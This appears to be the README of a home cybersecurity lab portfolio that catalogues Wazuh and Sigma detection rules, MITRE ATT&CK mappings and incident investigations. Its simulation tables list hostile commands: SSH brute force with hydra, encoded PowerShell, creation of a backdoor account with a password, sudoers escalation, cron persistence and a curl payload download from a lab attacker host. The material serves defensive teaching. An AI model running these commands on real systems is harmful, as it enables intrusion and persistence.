# 🛡️ SOCForge: Enterprise Detection Engineering & Incident Response Lab

[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-v14.1-red.svg)](https://attack.mitre.org/)
[![Wazuh SIEM](https://img.shields.io/badge/Wazuh-v4.14.7-blue.svg)](https://wazuh.com/)
[![Sigma Rules](https://img.shields.io/badge/Sigma%20Rules-10%20Engineered-brightgreen.svg)](detections/sigma/)
[![Sysmon](https://img.shields.io/badge/Microsoft%20Sysmon-v15.21-0078D4.svg)](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
[![Target OS](https://img.shields.io/badge/Target-Windows%2011%20%7C%20Ubuntu%2024.04-00A4EF.svg)](https://ubuntu.com/)
[![Attacker](https://img.shields.io/badge/Attacker-Kali%20Linux-557C94.svg)](https://www.kali.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

---

## 📌 Executive Overview

**SOCForge** is an enterprise-grade cybersecurity detection engineering, attack simulation, and incident investigation laboratory built inside an isolated virtual environment. 

It demonstrates the complete lifecycle of modern cross-platform security operations across **Windows (Sysmon)** and **Linux (Auditd/PAM)**: from external adversary reconnaissance and HTTP C2 ingress staging, through privilege escalation and persistence, to real-time SIEM detection rule authoring, hypothesis-driven threat hunting, and verified forensic eradication.


<img width="1276" height="378" alt="image" src="https://github.com/user-attachments/assets/43593d01-48a5-4546-be5d-2488754104a6" />

---

## 📊 Detection Engineering & Lab Metrics

| Metric | Result | Context |
|:---|:---:|:---|
| **Total Custom Detections Engineered** | **10** | 6 Windows (`100100`–`100105`) + 4 Linux (`100200`–`100203`) |
| **Sigma Generic Signatures Authored** | **10 Rules** | Standard SIEM-agnostic YAML in [`detections/sigma/`](detections/sigma/) |
| **Detections Validated Live** | **10 / 10 (100%)** | Unit-tested with `wazuh-logtest` & validated on live endpoints |
| **Monitored Endpoint Platforms** | **Windows & Linux** | Windows 11 Enterprise (Sysmon) + Ubuntu Server 24.04 (Auditd) |
| **MITRE ATT&CK Coverage** | **7 Tactics / 14 Techniques** | Recon, Initial Access, Execution, Persistence, PrivEsc, Defense Evasion, C2 |
| **Investigation Case Studies** | **CASE-001 & CASE-002** | Full incident lifecycles across Windows and Linux |
| **IR Playbooks Authored** | **3 Playbooks** | Task eradication, Windows backdoor, Linux backdoor & cron |


---

## 🖥️ Live SOC Operations Dashboard

The custom **SOCForge Security Operations Dashboard** provides single-pane-of-glass visibility across the entire attack lifecycle, custom detection metrics, and endpoint forensics:

### 1. Executive KPIs & Incident Timeline
![SOCForge KPIs and Security Timeline](screenshots/dashboards/socforge_dashboard_kpi_timeline.png)
*Figure 1: Top-level executive KPIs showing 1,250 total alerts, 108 high/critical incidents, 178 custom SOCForge detection hits across 2 monitored endpoints, and the attack activity timeline.*

### 2. Detection Analytics & MITRE ATT&CK Breakdown
![SOCForge Detection Analytics and MITRE ATT&CK](screenshots/dashboards/socforge_dashboard_analytics_mitre.png)
*Figure 2: Custom detection activity breakdown, alert severity level distribution (Levels 3–15), MITRE ATT&CK technique distribution, and persistence event types (Sysmon EID 12).*

### 3. Forensic Process Investigation Table
![SOCForge Suspicious Process Investigation](screenshots/dashboards/socforge_dashboard_process_table.png)
*Figure 3: Forensic process investigation table tracking parent/child relationships (PowerShell PID 572), obfuscated arguments, and execution counts.*

## 🏗️ Architecture & Network Topology

<img width="1277" height="552" alt="image" src="https://github.com/user-attachments/assets/f94b0436-b28e-46bc-bebf-3f86b4e78017" />

*See [`architecture/architecture.md`](architecture/architecture.md) for full topology details.*



---

## 🗺️ MITRE ATT&CK Matrix & Live SIEM Heatmap

### 🪟 Windows Intrusion Simulation (`CASE-001` / `SCENARIO-001`)
| MITRE Tactic | Technique ID | Technique Name | Simulation Command / Telemetry | Detection Rule | Level |
|:---|:---|:---|:---|:---|:---:|
| **Discovery** | `T1046` | Network Service Discovery | `nmap -Pn -sS -p 135-5985 192.168.56.105` | Sysmon EID 3 (Inbound) | Low |
| **Command and Control** | `T1071.001` | Web Protocols (HTTP) | Outbound connection to `192.168.56.101:8080` | Rule `100103` | **Level 9** |
| **Command and Control** | `T1105` | Ingress Tool Transfer | Dropped file `C:\Windows\Temp\payload.ps1` (52 B) | Native Rule `92201` | **Level 9** |
| **Execution** | `T1059.001` | PowerShell Execution | `powershell.exe -ExecutionPolicy Bypass -File payload.ps1` | Rule `100100` / Native `92029` | **Level 7** |
| **Defense Evasion** | `T1027` | Obfuscated Files/Info | `powershell.exe -EncodedCommand VwBy...` | Rule `100101` / Native `92057` | **Level 10** / **12** |
| **Execution** | `T1059.003` | Windows Command Shell | `cmd.exe /c "whoami && netstat -ano"` | Rule `100102` / Native `92004` | **Level 8** |
| **Discovery** | `T1087` | Account Discovery | `whoami.exe`, `net.exe user` | Native Rules `92032`, `92039` | Level 3 |
| **Persistence** | `T1053.005` | Scheduled Task Creation | `schtasks.exe /create /tn "SOCForgePersistence"...` | Rule `100104` / Native `92154` | **Level 10** |
| **Privilege Escalation** | `T1136.001` / `T1098` | Local Account & Manipulation | `net user socforge_backdoor P@ssw0rd123! /add` | Rule `100105` | **Level 10** |

### 🐧 Linux Intrusion Simulation (`CASE-002` / `SCENARIO-002`)
| MITRE Tactic | Technique ID | Technique Name | Simulation Command / Telemetry | Detection Rule | Level |
|:---|:---|:---|:---|:---|:---:|
| **Credential Access** | `T1110.001` | Password Guessing (Brute Force) | `hydra -l socforgelinux -P rockyou.txt ssh://192.168.56.107` | Rule `5712` | **Level 10** |
| **Initial Access** | `T1078` | Valid Accounts (SSH Login) | `ssh socforgelinux@192.168.56.107` | Rule `5715` | Level 3 |
| **Discovery** | `T1087.001` / `T1082` | Local Accounts & System Discovery | `whoami`, `id`, `uname -a`, `cat /etc/passwd`, `sudo -l` | PAM / Auditd | Level 3 |
| **Privilege Escalation** | `T1136.001` | Rogue User Account Creation | `sudo useradd -m -s /bin/bash socforge_backdoor` | **Rule `100200`** | **Level 10** |
| **Privilege Escalation** | `T1098` / `T1548.003` | Sudoers Group Escalation | `sudo usermod -aG sudo socforge_backdoor` | **Rule `100201`** | **Level 10** |
| **Persistence** | `T1053.003` | Scheduled Cron Persistence | `echo "* * * * * root ..." \| sudo tee /etc/cron.d/socforge_persistence` | **Rule `100202`** | **Level 10** |
| **Command & Control** | `T1105` / `T1071.001` | Ingress Tool Transfer | `curl -o /tmp/payload.sh http://192.168.56.101:8080/linux_payload.sh` | **Rule `100203`** | **Level 8** |

### 📊 Live Wazuh MITRE ATT&CK Dashboard View

![Wazuh MITRE ATT&CK Framework Matrix](screenshots/dashboards/wazuh_mitre_framework.png)

---

## 📜 Custom Detection Engineering Catalog

All 10 custom rules are engineered in both **Wazuh XML** (`local_rules.xml`) and **SIEM-Agnostic Sigma YAML**:

### 🪟 Windows Telemetry Rules (`100100` – `100105`)
| Rule ID | Detection Focus | MITRE Technique | Wazuh Deep Dive | Sigma Rule (YAML) |
|:---:|:---|:---:|:---|:---|
| **`100100`** | PowerShell Process Execution | `T1059.001` | [`powershell-execution.md`](detections/windows/powershell-execution.md) | [`proc_creation_win_powershell_execution.yml`](detections/sigma/proc_creation_win_powershell_execution.yml) |
| **`100101`** | Obfuscated / Encoded PowerShell | `T1059.001` / `T1027` | [`powershell-execution.md`](detections/windows/powershell-execution.md) | [`proc_creation_win_powershell_encoded_command.yml`](detections/sigma/proc_creation_win_powershell_encoded_command.yml) |
| **`100102`** | Command Shell Spawned by PowerShell | `T1059.003` | [`powershell-execution.md`](detections/windows/powershell-execution.md) | [`proc_creation_win_powershell_spawning_cmd.yml`](detections/sigma/proc_creation_win_powershell_spawning_cmd.yml) |
| **`100103`** | Outbound C2 Network Traffic | `T1071.001` | [`c2-network-traffic.md`](detections/windows/c2-network-traffic.md) | [`net_connection_win_c2_suspicious_traffic.yml`](detections/sigma/net_connection_win_c2_suspicious_traffic.yml) |
| **`100104`** | Scheduled Task Persistence | `T1053.005` | [`scheduled-task-persistence.md`](detections/windows/scheduled-task-persistence.md) | [`proc_creation_win_schtasks_persistence.yml`](detections/sigma/proc_creation_win_schtasks_persistence.yml) |
| **`100105`** | Backdoor User & Privilege Escalation | `T1136.001` / `T1098` | [`account-manipulation.md`](detections/windows/account-manipulation.md) | [`proc_creation_win_net_account_creation.yml`](detections/sigma/proc_creation_win_net_account_creation.yml) |

### 🐧 Linux Telemetry Rules (`100200` – `100203`)
| Rule ID | Detection Focus | MITRE Technique | Wazuh Deep Dive | Sigma Rule (YAML) |
|:---:|:---|:---:|:---|:---|
| **`100200`** | Rogue Local User Account via Useradd | `T1136.001` | [`linux-account-privesc.md`](detections/linux/linux-account-privesc.md) | [`proc_creation_lnx_useradd_backdoor.yml`](detections/sigma/proc_creation_lnx_useradd_backdoor.yml) |
| **`100201`** | Sudoers Group Privilege Escalation | `T1098` / `T1548.003` | [`linux-account-privesc.md`](detections/linux/linux-account-privesc.md) | [`proc_creation_lnx_usermod_sudoers.yml`](detections/sigma/proc_creation_lnx_usermod_sudoers.yml) |
| **`100202`** | Scheduled Cron Persistence Creation | `T1053.003` | [`linux-cron-persistence.md`](detections/linux/linux-cron-persistence.md) | [`proc_creation_lnx_cron_persistence.yml`](detections/sigma/proc_creation_lnx_cron_persistence.yml) |
| **`100203`** | Ingress Tool Transfer via Curl/Wget | `T1105` / `T1071.001` | [`linux-c2-ingress.md`](detections/linux/linux-c2-ingress.md) | [`lnx_ingress_tool_transfer_curl.yml`](detections/sigma/lnx_ingress_tool_transfer_curl.yml) |

---

## 📁 Repository Structure

```text
SOCForge/
├── README.md                           # Master repository documentation
├── LICENSE                             # MIT License
├── .gitignore                          # Standard git ignore rules
│
├── architecture/
│   └── architecture.md                 # Full network topology & telemetry pipeline
│
├── lab/
│   ├── wazuh-server.md                 # Wazuh Manager, OpenSearch & Analysisd setup
│   ├── windows-endpoint.md             # Windows 11, Sysmon & Agent EventChannel config
│   ├── kali-attacker.md                # Kali Linux adversary node & HTTP stager setup
│   └── network-configuration.md        # Subnet routing & IP allocations
│
├── detections/
│   ├── wazuh/
│   │   └── local_rules.xml             # Production XML detection rules (100100–100203)
│   ├── sigma/
│   │   ├── README.md                   # Sigma catalog & SIEM query translation guide
│   │   └── *.yml                       # 10 Standard SIEM-agnostic Sigma rules
│   ├── windows/                        # Windows detection rule deep-dives
│   │   ├── powershell-execution.md
│   │   ├── scheduled-task-persistence.md
│   │   ├── account-manipulation.md
│   │   └── c2-network-traffic.md
│   └── linux/                          # Linux detection rule deep-dives
│       ├── linux-account-privesc.md
│       ├── linux-cron-persistence.md
│       └── linux-c2-ingress.md
│
├── attack-scenarios/
│   ├── 001-kali-windows-intrusion/     # Windows multi-stage attack playbook
│   │   ├── scenario.md
│   │   └── payload.ps1
│   └── 002-kali-linux-intrusion/       # Linux multi-stage attack playbook
│       ├── scenario.md
│       └── payload.sh
│
├── investigations/
│   ├── CASE-001/                       # Windows incident investigation case report & timeline
│   │   ├── investigation.md
│   │   └── timeline.md
│   └── CASE-002/                       # Linux incident investigation case report & timeline
│       ├── investigation.md
│       └── timeline.md
│
├── threat-hunting/
│   ├── hypothesis-001-lolbins.md       # Hypothesis-driven hunt for LOLBins & bypasses
│   └── hunting-queries.md              # Master grep hunting queries & ProcessGUID table
│
├── incident-response/
│   ├── scheduled-task-eradication.md   # Windows task persistence removal playbook
│   ├── backdoor-account-removal.md     # Windows backdoor administrator removal playbook
│   └── linux-backdoor-and-cron-eradication.md # Linux rogue user & cron eradication playbook
│
├── validation/
│   └── detection-test-results.md       # Logtest and live validation matrix
│
└── screenshots/
    └── dashboards/                     # Live Wazuh SIEM portal evidence
```


---

## 👤 Author & License

- **Project:** SOCForge Cybersecurity Portfolio Project
- **Focus:** SOC Operations, SIEM Architecture, Detection Engineering, Threat Hunting & DFIR
- **License:** [MIT License](LICENSE)
